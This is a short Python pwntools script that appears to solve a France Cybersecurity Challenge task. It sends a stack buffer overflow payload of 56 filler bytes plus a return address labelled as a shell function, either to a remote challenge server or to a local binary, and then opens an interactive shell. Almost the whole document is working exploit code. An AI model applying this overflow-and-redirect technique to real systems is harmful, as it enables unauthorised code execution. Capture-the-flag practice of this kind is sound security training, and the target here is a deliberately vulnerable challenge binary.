#!/usr/bin/env python3

from pwn import *

if args.REMOTE:
    p = remote("challenges.france-cybersecurity-challenge.fr", 2050)
else:
    p = process("./pwn")

# address of shell : 0x4011a2
# offset : 56

pay = b"A" * 56 + p64(0x4011a2)

p.sendline(pay)
p.interactive()
